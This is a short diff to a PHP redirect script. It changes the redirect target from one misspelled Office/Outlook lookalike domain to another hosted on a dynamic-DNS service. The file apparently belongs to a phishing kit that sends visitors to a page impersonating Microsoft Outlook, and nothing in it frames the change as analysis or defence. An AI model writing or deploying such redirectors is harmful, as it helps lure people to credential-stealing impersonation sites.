@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://officez-outlok.live/"); 
+header("Location: https://officez-outloklive.camdvr.org/"); 
   
 exit; 
 ?> 
